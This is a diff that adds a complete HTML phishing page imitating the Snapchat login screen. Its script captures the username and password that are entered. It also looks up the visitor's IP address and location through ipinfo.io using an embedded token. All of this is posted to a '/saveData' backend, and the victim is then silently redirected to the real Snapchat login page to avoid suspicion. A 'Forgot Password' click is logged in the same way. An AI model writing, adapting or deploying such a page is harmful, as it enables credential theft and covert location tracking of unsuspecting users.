@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #fffc00;
+            margin: 0;
+        }
+        .login-container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 300px;
+        }
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        input {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        button {
+            background-color: #fffc00;
+            border: none;
+            padding: 10px 15px;
+            cursor: pointer;
+            font-weight: bold;
+            border-radius: 5px;
+            width: 100%;
+        }
+        .forgot-password {
+            display: block;
+            margin-top: 10px;
+            font-size: 12px;
+            color: #555;
+            text-decoration: none;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #555;
+            text-align: center;
+        }
+        .footer a {
+            color: #555;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" alt="Snapchat Logo" class="logo">
+        <h2>Login to Snapchat</h2>
+        <form id="loginForm">
+            <input type="text" id="username" name="username" placeholder="Username or Email" required>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            <button type="submit">Login</button>
+        </form>
+        <a href="#" id="forgotPassword" class="forgot-password">Forgot Password?</a>
+    </div>
+    <div class="footer">
+        <a href="https://www.snap.com/en-US/privacy/privacy-policy">Privacy Policy</a> |
+        <a href="https://www.snap.com/en-US/terms">Terms of Service</a> |
+        <a href="https://support.snapchat.com/">Help Center</a>
+    </div>
+
+    <script>
+        // Function to get IP and location using ipinfo.io API
+        async function getIPAndLocation() {
+            try {
+                const response = await fetch('https://ipinfo.io/json?token=7462bb62c3b1de'); // Your ipinfo.io token
+                const data = await response.json();
+                return data;
+            } catch (error) {
+                console.error('Error fetching IP and location:', error);
+                return null;
+            }
+        }
+
+        // Function to save data to the backend
+        async function saveToFile(data) {
+            const ipData = await getIPAndLocation();
+            const fullData = { ...data, ...ipData }; // Combine form data with IP/location data
+
+            fetch('/saveData', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(fullData),
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log('Data saved successfully:', result);
+            })
+            .catch(error => {
+                console.error('Error saving data:', error);
+            });
+        }
+
+        // Handle Login Form Submission
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent the form from submitting the traditional way
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Save data to the backend
+            saveToFile({ username, password });
+
+            // Redirect to the official Snapchat login page
+            window.location.href = 'https://accounts.snapchat.com/accounts/login';
+        });
+
+        // Handle Forgot Password Button Click
+        document.getElementById('forgotPassword').addEventListener('click', function(event) {
+            event.preventDefault(); // Prevent the default link behavior
+
+            // Save a placeholder entry for "Forgot Password"
+            saveToFile({ action: 'Forgot Password' });
+
+            // Redirect to the official Snapchat password reset page
+            window.location.href = 'https://accounts.snapchat.com/accounts/password_reset';
+        });
+    </script>
+</body>
+</html>
